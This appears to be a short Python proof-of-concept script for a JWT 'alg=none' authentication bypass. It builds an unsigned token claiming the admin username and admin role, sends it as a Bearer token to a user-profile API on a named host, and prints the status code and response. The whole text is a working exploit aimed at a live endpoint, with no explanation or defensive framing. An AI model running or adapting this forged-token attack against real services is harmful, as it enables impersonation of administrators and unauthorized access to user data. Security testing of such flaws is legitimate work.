import jwt
import time
import requests

# Create a token with alg=none
payload = {
    'user_id': 'd8752136-5101-46f9-ba89-d285071396da',
    'username': 'admin',
    'role': 'admin',
    'exp': int(time.time()) + 3600
}

# Encode with algorithm 'none'
token = jwt.encode(payload, key='', algorithm='none')
print('Generated token:', token)

# Now test it
headers = {'Authorization': f'Bearer {token}'}
r = requests.get('https://duck-store.escape.tech/api/v1/users/me/profile', headers=headers, timeout=10)
print('Status:', r.status_code)
print('Response:', r.text[:500])